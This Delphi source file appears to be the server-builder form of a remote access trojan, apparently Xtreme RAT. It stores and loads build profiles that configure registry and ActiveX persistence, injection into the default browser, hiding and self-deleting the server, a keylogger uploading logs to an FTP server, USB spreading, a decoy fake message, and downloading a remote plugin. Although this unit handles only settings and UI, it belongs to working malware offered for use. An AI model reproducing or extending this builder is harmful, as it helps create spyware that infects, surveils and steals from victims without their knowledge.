unit UnitCreateServer;
{$I Compilar.inc}

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, AdvMemo, ImgList, ComCtrls, Buttons, ExtCtrls, StdCtrls, sPanel;

type
  TFormCreateServer = class(TForm)
    Panel1: TsPanel;
    PageScroller1: TPageScroller;
    Panel2: TsPanel;
    Panel3: TsPanel;
    Label1: TLabel;
    Label2: TLabel;
    Bevel1: TBevel;
    MainPanel: TsPanel;
    StatusBar: TStatusBar;
    ImageList1: TImageList;
    SpeedButton1: TSpeedButton;
    Bevel4: TBevel;
    Bevel5: TBevel;
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    SpeedButton4: TSpeedButton;
    SpeedButton5: TSpeedButton;
    SpeedButton6: TSpeedButton;
    SpeedButton7: TSpeedButton;
    procedure FormCreate(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    SelectedProfile: string;
    BinderList: TStringList;
    procedure SalvarDados(ProfileFileName: string);
    procedure LerDados(ProfileFileName: string);
    procedure InserirDadosNoMemo(Memo: TAdvMemo);
    procedure AtualizarIdomas;
  end;

var
  FormCreateServer: TFormCreateServer;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitConstantes,
  UnitSelectProfile,
  UnitInstallSettings,
  UnitKeyloggerSettings,
  UnitBinderSettings,
  UnitBuildServer,
  UnitConnectionSettings,
  UnitFakeMessage,
  CustomIniFiles,
  UnitConfigs,
  UnitCommonProcedures;

procedure TFormCreateServer.SalvarDados(ProfileFileName: string);
var
  IniFile: TIniFile;
  I: Integer;
  s: string;
begin
  IniFile := TIniFile.Create(ProfileFileName, IniFilePassword);

  for I := 0 to NUMMAXCONNECTION - 1 do
  begin
    IniFile.WriteInteger('settings', 'Ports' + inttostr(i), ConfiguracoesServidor.Ports[i]);
    IniFile.WriteString('settings', 'DNS' + inttostr(i), UnicodeToAnsi(ConfiguracoesServidor.DNS[i], CP_UTF8, False));
  end;
  IniFile.WriteString('settings', 'ServerID', UnicodeToAnsi(ConfiguracoesServidor.ServerID, CP_UTF8, False));
  IniFile.WriteString('settings', 'GroupID', UnicodeToAnsi(ConfiguracoesServidor.GroupID, CP_UTF8, False));
  IniFile.WriteInteger('settings', 'Password', ConfiguracoesServidor.Password);

  IniFile.WriteBool('settings', 'CopyServer', ConfiguracoesServidor.CopyServer);
  IniFile.WriteString('settings', 'ServerFileName', UnicodeToAnsi(ConfiguracoesServidor.ServerFileName, CP_UTF8, False));
  IniFile.WriteString('settings', 'ServerFolder', UnicodeToAnsi(ConfiguracoesServidor.ServerFolder, CP_UTF8, False));
  IniFile.WriteInteger('settings', 'SelectedDir', ConfiguracoesServidor.SelectedDir);
  IniFile.WriteBool('settings', 'Melt', ConfiguracoesServidor.Melt);
  IniFile.WriteBool('settings', 'HideServer', ConfiguracoesServidor.HideServer);
  IniFile.WriteString('settings', 'InjectProcess', UnicodeToAnsi(ConfiguracoesServidor.InjectProcess, CP_UTF8, False));
  IniFile.WriteBool('settings', 'Restart', ConfiguracoesServidor.Restart);
  IniFile.WriteString('settings', 'HKLMRun', UnicodeToAnsi(ConfiguracoesServidor.HKLMRun, CP_UTF8, False));
  IniFile.WriteString('settings', 'HKCURun', UnicodeToAnsi(ConfiguracoesServidor.HKCURun, CP_UTF8, False));
  IniFile.WriteString('settings', 'ActiveX', UnicodeToAnsi(ConfiguracoesServidor.ActiveX, CP_UTF8, False));
  IniFile.WriteBool('settings', 'HKLMRunBool', ConfiguracoesServidor.HKLMRunBool);
  IniFile.WriteBool('settings', 'HKCURunBool', ConfiguracoesServidor.HKCURunBool);
  IniFile.WriteBool('settings', 'ActiveXBool', ConfiguracoesServidor.ActiveXBool);
  IniFile.WriteBool('settings', 'MoreStartUP', ConfiguracoesServidor.MoreStartUP);
  IniFile.WriteBool('settings', 'RunOnceBool', ConfiguracoesServidor.RunOnceBool);
  IniFile.WriteBool('settings', 'WinLoadBool', ConfiguracoesServidor.WinLoadBool);
  IniFile.WriteBool('settings', 'WinShellBool', ConfiguracoesServidor.WinShellBool);
  IniFile.WriteBool('settings', 'RunPolicies', ConfiguracoesServidor.RunPolicies);
  IniFile.WriteString('settings', 'MoreStartUPName', UnicodeToAnsi(ConfiguracoesServidor.MoreStartUPName, CP_UTF8, False));

  IniFile.WriteBool('settings', 'Persist', ConfiguracoesServidor.Persistencia);

  IniFile.WriteBool('settings', 'ActiveKeylogger', ConfiguracoesServidor.ActiveKeylogger);
  IniFile.WriteBool('settings', 'USBSpreader', ConfiguracoesServidor.USBSpreader);
  IniFile.WriteBool('settings', 'KeyDelBackspace', ConfiguracoesServidor.KeyDelBackspace);
  IniFile.WriteBool('settings', 'SendFTPLogs', ConfiguracoesServidor.SendFTPLogs);
  IniFile.WriteString('settings', 'RecordWords', UnicodeToAnsi(ConfiguracoesServidor.RecordWords, CP_UTF8, False));
  IniFile.WriteString('settings', 'FTPAddress', UnicodeToAnsi(ConfiguracoesServidor.FTPAddress, CP_UTF8, False));
  IniFile.WriteString('settings', 'FTPFolder', UnicodeToAnsi(ConfiguracoesServidor.FTPFolder, CP_UTF8, False));
  IniFile.WriteString('settings', 'FTPUser', UnicodeToAnsi(ConfiguracoesServidor.FTPUser, CP_UTF8, False));
  IniFile.WriteString('settings', 'FTPPass', UnicodeToAnsi(ConfiguracoesServidor.FTPPass, CP_UTF8, False));
  IniFile.WriteInteger('settings', 'FTPFreq', ConfiguracoesServidor.FTPFreq);
  IniFile.WriteBool('settings', 'FTPDelLogs', ConfiguracoesServidor.FTPDelLogs);

  IniFile.WriteBool('settings', 'UseFakeMessage', ConfiguracoesServidor.UseFakeMessage);
  IniFile.WriteString('settings', 'FakeMessageCaption', UnicodeToAnsi(ConfiguracoesServidor.FakeMessageCaption, CP_UTF8, False));
  s := ConfiguracoesServidor.FakeMessageText;
  s := ReplaceString(#13#10, '#13#10', s);
  IniFile.WriteString('settings', 'FakeMessageText', UnicodeToAnsi(s, CP_UTF8, False));
  IniFile.WriteInteger('settings', 'FakeMessageType', ConfiguracoesServidor.FakeMessageType);
  IniFile.WriteInteger('settings', 'FakeMessageAnswer', ConfiguracoesServidor.FakeMessageAnswer);

  IniFile.WriteString('settings', 'Mutex', UnicodeToAnsi(ConfiguracoesServidor.Mutex, CP_UTF8, False));
  IniFile.WriteInteger('settings', 'Delay', ConfiguracoesServidor.Delay);
  IniFile.WriteString('settings', 'PluginLink', UnicodeToAnsi(ConfiguracoesServidor.PluginLink, CP_UTF8, False));
  IniFile.WriteBool('settings', 'DownloadPlugin', ConfiguracoesServidor.DownloadPlugin);

  IniFile.Free;
end;

procedure TFormCreateServer.LerDados(ProfileFileName: string);
var
  IniFile: TIniFile;
  I: Integer;
  s: WideString;
begin
  IniFile := TIniFile.Create(ProfileFileName, IniFilePassword);

  {$IFDEF XTREMETRIAL}
  ConfiguracoesServidor.Ports[0] := 81;
  ConfiguracoesServidor.DNS[0] := '127.0.0.1';
  {$ELSE}
  ConfiguracoesServidor.Ports[0] := IniFile.ReadInteger('settings', 'Ports0', 81);
  ConfiguracoesServidor.DNS[0] := StrToArray(UTF8ToAnsi(IniFile.ReadString('settings', 'DNS0', '127.0.0.1')));
  if ConfiguracoesServidor.Ports[0] <= 0 then ConfiguracoesServidor.Ports[0] := 81;
  if ConfiguracoesServidor.DNS[0] = '' then ConfiguracoesServidor.DNS[0] := StrToArray('127.0.0.1');
  {$ENDIF}

  {$IFDEF XTREMETRIAL}
  for I := 1 to NUMMAXCONNECTION - 1 do
  begin
    ConfiguracoesServidor.Ports[i] := 0;
    ConfiguracoesServidor.DNS[i] := '';
  end;
  {$ELSE}
  for I := 1 to NUMMAXCONNECTION - 1 do
  begin
    ConfiguracoesServidor.Ports[i] := IniFile.ReadInteger('settings', 'Ports' + inttostr(i), 0);
    if ConfiguracoesServidor.Ports[i] > 0 then
    ConfiguracoesServidor.DNS[i] := StrToArray(UTF8ToAnsi(IniFile.ReadString('settings', 'DNS' + inttostr(i), '')));
  end;
  {$ENDIF}

  ConfiguracoesServidor.Password := IniFile.ReadInteger('settings', 'Password', 1234567890);
  ConfiguracoesServidor.ServerID := StrToLowArray(UTF8ToAnsi(IniFile.ReadString('settings', 'ServerID', 'Server')));
  ConfiguracoesServidor.GroupID := StrToLowArray(UTF8ToAnsi(IniFile.ReadString('settings', 'GroupID', 'Servers')));

  ConfiguracoesServidor.CopyServer := IniFile.ReadBool('settings', 'CopyServer', True);
  ConfiguracoesServidor.ServerFileName := StrToLowArray(UTF8ToAnsi(IniFile.ReadString('settings', 'ServerFileName', 'Server.exe')));
  ConfiguracoesServidor.ServerFolder := StrToLowArray(UTF8ToAnsi(IniFile.ReadString('settings', 'ServerFolder', 'InstallDir')));
  ConfiguracoesServidor.SelectedDir := IniFile.ReadInteger('settings', 'SelectedDir', 0);
  if (ConfiguracoesServidor.SelectedDir <= 0) or (ConfiguracoesServidor.SelectedDir > 5) then ConfiguracoesServidor.SelectedDir := 0;
  ConfiguracoesServidor.Persistencia := IniFile.ReadBool('settings', 'Persist', False);
  ConfiguracoesServidor.Melt := IniFile.ReadBool('settings', 'Melt', False);
  ConfiguracoesServidor.HideServer := IniFile.ReadBool('settings', 'HideServer', False);

  s := UTF8ToAnsi(IniFile.ReadString('settings', 'InjectProcess', '%DEFAULTBROWSER%'));
  CopyMemory(@ConfiguracoesServidor.InjectProcess, @s[1], SizeOf(ConfiguracoesServidor.InjectProcess));

  ConfiguracoesServidor.Restart := IniFile.ReadBool('settings', 'Restart', True);
  ConfiguracoesServidor.HKLMRun := StrToLowArray(UTF8ToAnsi(IniFile.ReadString('settings', 'HKLMRun', 'HKLM')));
  ConfiguracoesServidor.HKCURun := StrToLowArray(UTF8ToAnsi(IniFile.ReadString('settings', 'HKCURun', 'HKCU')));
  ConfiguracoesServidor.ActiveX := StrToArray(UTF8ToAnsi(IniFile.ReadString('settings', 'ActiveX', '{5460C4DF-B266-909E-CB58-E32B79832EB2}')));
  ConfiguracoesServidor.HKLMRunBool := IniFile.ReadBool('settings', 'HKLMRunBool', True);
  ConfiguracoesServidor.HKCURunBool := IniFile.ReadBool('settings', 'HKCURunBool', True);
  ConfiguracoesServidor.ActiveXBool := IniFile.ReadBool('settings', 'ActiveXBool', True);

  ConfiguracoesServidor.MoreStartUpName := StrToLowArray(UTF8ToAnsi(IniFile.ReadString('settings', 'MoreStartUpName', 'Server')));
  ConfiguracoesServidor.MoreStartUp := IniFile.ReadBool('settings', 'MoreStartUp', False);
  ConfiguracoesServidor.RunOnceBool := IniFile.ReadBool('settings', 'RunOnceBool', False);
  ConfiguracoesServidor.WinLoadBool := IniFile.ReadBool('settings', 'WinLoadBool', False);
  ConfiguracoesServidor.WinShellBool := IniFile.ReadBool('settings', 'WinShellBool', False);
  ConfiguracoesServidor.RunPolicies := IniFile.ReadBool('settings', 'RunPolicies', False);

  ConfiguracoesServidor.ActiveKeylogger := IniFile.ReadBool('settings', 'ActiveKeylogger', True);
  ConfiguracoesServidor.USBSpreader := IniFile.ReadBool('settings', 'USBSpreader', False);
  ConfiguracoesServidor.KeyDelBackspace := IniFile.ReadBool('settings', 'KeyDelBackspace', False);
  ConfiguracoesServidor.RecordWords := StrToArray(UTF8ToAnsi(IniFile.ReadString('settings', 'RecordWords', '')));
  ConfiguracoesServidor.SendFTPLogs := IniFile.ReadBool('settings', 'SendFTPLogs', False);
  ConfiguracoesServidor.FTPAddress := StrToArray(UTF8ToAnsi(IniFile.ReadString('settings', 'FTPAddress', 'ftp.ftpserver.com')));
  ConfiguracoesServidor.FTPFolder := StrToArray(UTF8ToAnsi(IniFile.ReadString('settings', 'FTPFolder', '')));
  ConfiguracoesServidor.FTPUser := StrToArray(UTF8ToAnsi(IniFile.ReadString('settings', 'FTPUser', 'ftpuser')));
  ConfiguracoesServidor.FTPPass := StrToArray(UTF8ToAnsi(IniFile.ReadString('settings', 'FTPPass', 'ftppass')));
  ConfiguracoesServidor.FTPFreq := IniFile.ReadInteger('settings', 'FTPFreq', 0);
  ConfiguracoesServidor.FTPDelLogs := IniFile.ReadBool('settings', 'FTPDelLogs', False);

  ConfiguracoesServidor.Delay := IniFile.ReadInteger('settings', 'Delay', 0);
  s := UTF8ToAnsi(IniFile.ReadString('settings', 'Mutex', '((Mutex))'));
  CopyMemory(@ConfiguracoesServidor.Mutex, @s[1], SizeOf(ConfiguracoesServidor.Mutex));

  s := ConfiguracoesServidor.Mutex + 'EXIT';
  CopyMemory(@ConfiguracoesServidor.MutexSair, @s[1], SizeOf(ConfiguracoesServidor.MutexSair));

  s := ConfiguracoesServidor.Mutex + 'PERSIST';
  CopyMemory(@ConfiguracoesServidor.MutexPersist, @s[1], SizeOf(ConfiguracoesServidor.MutexPersist));

  ConfiguracoesServidor.Versao := StrToLowArray(VersaoDoPrograma);
  ConfiguracoesServidor.CheckRealConfig := 123456;

  ConfiguracoesServidor.UseFakeMessage := IniFile.ReadBool('settings', 'UseFakeMessage', False);

  s := UTF8ToAnsi(IniFile.ReadString('settings', 'FakeMessageCaption', Traduzidos[574]));
  CopyMemory(@ConfiguracoesServidor.FakeMessageCaption, @s[1], SizeOf(ConfiguracoesServidor.FakeMessageCaption));

  s := UTF8ToAnsi(IniFile.ReadString('settings', 'FakeMessageText', Traduzidos[575]));
  s := ReplaceString('#13#10', #13#10, s);
  CopyMemory(@ConfiguracoesServidor.FakeMessageText, @s[1], SizeOf(ConfiguracoesServidor.FakeMessageText));

  ConfiguracoesServidor.FakeMessageType := IniFile.ReadInteger('settings', 'FakeMessageType', 1);
  if (ConfiguracoesServidor.FakeMessageType < 0) or (ConfiguracoesServidor.FakeMessageType > 4) then
  ConfiguracoesServidor.FakeMessageType := 1;

  ConfiguracoesServidor.FakeMessageAnswer := IniFile.ReadInteger('settings', 'FakeMessageAnswer', 0);
  if (ConfiguracoesServidor.FakeMessageAnswer < 0) or (ConfiguracoesServidor.FakeMessageAnswer > 5) then
  ConfiguracoesServidor.FakeMessageAnswer := 0;

  ConfiguracoesServidor.DownloadPlugin := IniFile.ReadBool('settings', 'DownloadPlugin', False);

  s := UTF8ToAnsi(IniFile.ReadString('settings', 'PluginLink', 'http://www.webserver.com/plugin.xtr'));
  if Length(s) > 0 then
  CopyMemory(@ConfiguracoesServidor.PluginLink, @s[1], Length(s) * 2);

  IniFile.Free;
end;

procedure TFormCreateServer.InserirDadosNoMemo(Memo: TAdvMemo);
var
  i, j: integer;
  Distancia: integer;
  Espaco: string;
begin
  Distancia := 20;
  Espaco := '   ';
  Memo.Clear;

  Memo.Lines.Add(Traduzidos[24]);
  j := 0;
  for I := 0 to NUMMAXCONNECTION - 1 do
  if (ConfiguracoesServidor.Ports[i] > 0) and (ConfiguracoesServidor.DNS[i] <> '') then
  begin
    Memo.Lines.Add(justl(Espaco + Traduzidos[88] + '[' + inttostr(j) + ']', Distancia) + ' = ' + ConfiguracoesServidor.DNS[i] + ':' + IntToStr(ConfiguracoesServidor.Ports[i]));
    inc(j);
  end;
  Memo.Lines.Add(justl(Espaco + Traduzidos[45], Distancia) + ' = ' + ConfiguracoesServidor.ServerID);
  Memo.Lines.Add(justl(Espaco + Traduzidos[46], Distancia) + ' = ' + ConfiguracoesServidor.GroupID);

  Memo.Lines.Add(Traduzidos[89]);
  if ConfiguracoesServidor.CopyServer = false then
    Memo.Lines.Add(justl(Espaco + Traduzidos[48], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.CopyServer)) else
  begin
    Memo.Lines.Add(justl(Espaco + Traduzidos[48], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.CopyServer));
    Memo.Lines.Add(justl(Espaco + Traduzidos[49] + ':', Distancia) + ' = ' + ConfiguracoesServidor.ServerFileName);
    Memo.Lines.Add(justl(Espaco + Traduzidos[51] + ':', Distancia) + ' = ' + '%' + Traduzidos[59 + ConfiguracoesServidor.SelectedDir] + '%\' + ConfiguracoesServidor.ServerFolder);
  end;
  Memo.Lines.Add(justl(Espaco + Traduzidos[90], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.Melt));
  Memo.Lines.Add(justl(Espaco + Traduzidos[55], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.Persistencia));
  Memo.Lines.Add(justl(Espaco + Traduzidos[57], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.USBSpreader));
  Memo.Lines.Add(justl(Espaco + Traduzidos[66], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.ActiveKeylogger));

  if ConfiguracoesServidor.ActiveKeylogger then
  begin
    if ConfiguracoesServidor.RecordWords <> '' then
    Memo.Lines.Add(justl(Espaco + Traduzidos[91] + ':', Distancia) + ' = ' + ConfiguracoesServidor.RecordWords);

    Memo.Lines.Add(justl(Espaco + Traduzidos[67], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.KeyDelBackspace));
    Memo.Lines.Add(justl(Espaco + Traduzidos[68], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.SendFTPLogs));
    if ConfiguracoesServidor.SendFTPLogs then
    begin
      Memo.Lines.Add(justl(Espaco + Traduzidos[69], Distancia) + ' = ' + ConfiguracoesServidor.FTPAddress);
      Memo.Lines.Add(justl(Espaco + Traduzidos[71], Distancia) + ' = ' + ConfiguracoesServidor.FTPFolder);
      Memo.Lines.Add(justl(Espaco + Traduzidos[70], Distancia) + ' = ' + ConfiguracoesServidor.FTPUser);
      Memo.Lines.Add(justl(Espaco + Traduzidos[73], Distancia) + ' = ' + Inttostr(5 + ConfiguracoesServidor.FTPFreq * 5) + ' ' + Traduzidos[74]);
      Memo.Lines.Add(justl(Espaco + Traduzidos[92], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.FTPDelLogs));
    end;
  end;

  Memo.Lines.Add(justl(Espaco + Traduzidos[56], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.HideServer));
  Memo.Lines.Add(justl(Espaco + Traduzidos[93], Distancia) + ' = ' + ConfiguracoesServidor.InjectProcess);
  Memo.Lines.Add(justl(Espaco + Traduzidos[58], Distancia) + ' = ' + ConfiguracoesServidor.Mutex);
  Memo.Lines.Add(justl(Espaco + 'Delay', Distancia) + ' = ' + IntToStr(ConfiguracoesServidor.Delay) + ' ' + Traduzidos[647]);

  if ConfiguracoesServidor.Restart = false then
    Memo.Lines.Add(justl(Espaco + Traduzidos[94], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.Restart)) else
  begin
    Memo.Lines.Add(justl(Espaco + Traduzidos[94], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.Restart));
    if ConfiguracoesServidor.HKLMRunBool then
    Memo.Lines.Add(justl(Espaco + 'HKLM\Run', Distancia) + ' = ' + ConfiguracoesServidor.HKLMRun);
    if ConfiguracoesServidor.HKCURunBool then
    Memo.Lines.Add(justl(Espaco + 'HKCU\Run', Distancia) + ' = ' + ConfiguracoesServidor.HKCURun);
    if ConfiguracoesServidor.ActiveXBool then
    Memo.Lines.Add(justl(Espaco + 'ActiveX', Distancia) + ' = ' + ConfiguracoesServidor.ActiveX);
    if ConfiguracoesServidor.MoreStartUp then
    begin
      if ConfiguracoesServidor.RunOnceBool then
      Memo.Lines.Add(justl(Espaco + 'RunOnce', Distancia) + ' = ' + ConfiguracoesServidor.MoreStartUpName);
      if ConfiguracoesServidor.WinLoadBool then
      Memo.Lines.Add(justl(Espaco + 'WinLoad', Distancia) + ' = ' + ConfiguracoesServidor.MoreStartUpName);
      if ConfiguracoesServidor.WinShellBool then
      Memo.Lines.Add(justl(Espaco + 'WinShell', Distancia) + ' = ' + ConfiguracoesServidor.MoreStartUpName);
      if ConfiguracoesServidor.RunPolicies then
      Memo.Lines.Add(justl(Espaco + 'Policies', Distancia) + ' = ' + ConfiguracoesServidor.MoreStartUpName);
    end;
  end;

  if ConfiguracoesServidor.UseFakeMessage = false then
    Memo.Lines.Add(justl(Espaco + Traduzidos[571], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.UseFakeMessage)) else
  begin
    Memo.Lines.Add(justl(Espaco + Traduzidos[571], Distancia) + ' = ' + BoolToStr(ConfiguracoesServidor.UseFakeMessage));

    if ConfiguracoesServidor.FakeMessageType = 0 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[428], Distancia) + ' = ' + Traduzidos[429]) else
    if ConfiguracoesServidor.FakeMessageType = 1 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[428], Distancia) + ' = ' + Traduzidos[430]) else
    if ConfiguracoesServidor.FakeMessageType = 2 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[428], Distancia) + ' = ' + Traduzidos[431]) else
    if ConfiguracoesServidor.FakeMessageType = 3 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[428], Distancia) + ' = ' + Traduzidos[432]) else
    if ConfiguracoesServidor.FakeMessageType = 4 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[428], Distancia) + ' = ' + Traduzidos[433]);

    if ConfiguracoesServidor.FakeMessageAnswer = 0 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[434], Distancia) + ' = ' + Traduzidos[435]) else
    if ConfiguracoesServidor.FakeMessageAnswer = 1 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[434], Distancia) + ' = ' + Traduzidos[436]) else
    if ConfiguracoesServidor.FakeMessageAnswer = 2 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[434], Distancia) + ' = ' + Traduzidos[437]) else
    if ConfiguracoesServidor.FakeMessageAnswer = 3 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[434], Distancia) + ' = ' + Traduzidos[438]) else
    if ConfiguracoesServidor.FakeMessageAnswer = 4 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[434], Distancia) + ' = ' + Traduzidos[439]) else
    if ConfiguracoesServidor.FakeMessageAnswer = 5 then
    Memo.Lines.Add(justl(Espaco + Traduzidos[434], Distancia) + ' = ' + Traduzidos[440]);

    Memo.Lines.Add(justl(Espaco + Traduzidos[572], Distancia) + ' = ' + ConfiguracoesServidor.FakeMessageCaption);
    Memo.Lines.Add(justl(Espaco + Traduzidos[573], Distancia) + ' = ' + ConfiguracoesServidor.FakeMessageText);
  end;
end;

procedure TFormCreateServer.AtualizarIdomas;
begin
  Caption := Traduzidos[22];
  Label1.Caption := NomeDoPrograma + ' ' + VersaoDoPrograma;
  Label2.Caption := Traduzidos[29];
  SpeedButton1.Hint := Traduzidos[30];
  SpeedButton2.Hint := Traduzidos[31];
  SpeedButton3.Hint := Traduzidos[32];
  SpeedButton4.Hint := Traduzidos[33];
  SpeedButton5.Hint := Traduzidos[34];
  SpeedButton6.Hint := Traduzidos[29];
  SpeedButton7.Hint := Traduzidos[571];
end;

procedure TFormCreateServer.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  ImageList1.GetBitmap(0, SpeedButton1.Glyph);
  ImageList1.GetBitmap(1, SpeedButton2.Glyph);
  ImageList1.GetBitmap(2, SpeedButton3.Glyph);
  ImageList1.GetBitmap(3, SpeedButton4.Glyph);
  ImageList1.GetBitmap(4, SpeedButton5.Glyph);
  ImageList1.GetBitmap(5, SpeedButton6.Glyph);
  ImageList1.GetBitmap(6, SpeedButton7.Glyph);
  BinderList := TStringList.Create;
end;

procedure TFormCreateServer.FormDestroy(Sender: TObject);
begin
  BinderList.Free;
end;

procedure TFormCreateServer.FormShow(Sender: TObject);
begin
  AtualizarIdomas;
  SpeedButton1.Click;
  SpeedButton1.Down := True;
end;

procedure TFormCreateServer.SpeedButton1Click(Sender: TObject);
// This method is a kind of scheduler. Here we switch between the forms.
var
  NewFormClass: TFormClass;
  NewForm: TForm;
begin
  case (Sender as TSpeedButton).Tag of
    0:
      NewFormClass := TFormSelectProfile;
    1:
      NewFormClass := TFormConnectionSettings;
    2:
      NewFormClass := TFormInstallSettings;
    3:
      NewFormClass := TFormKeyloggerSettings;
    4:
      NewFormClass := TFormBinderSettings;
    5:
      NewFormClass := TFormBuildServer;
    6:
      NewFormClass := TFormFakeMessage;
  else
    NewFormClass := nil;
  end;

  if (MainPanel.ControlCount = 0) or not (MainPanel.Controls[0] is NewFormClass) then
  begin
    if MainPanel.ControlCount > 0 then
      MainPanel.Controls[0].Free;

    if Assigned(NewFormClass) then
    begin
      NewForm := NewFormClass.Create(Self);
      NewForm.Hide;
      NewForm.BorderStyle := bsNone;
      NewForm.Parent := MainPanel;
      NewForm.Align := alClient;
      NewForm.Show;
    end;
  end;
end;

end.
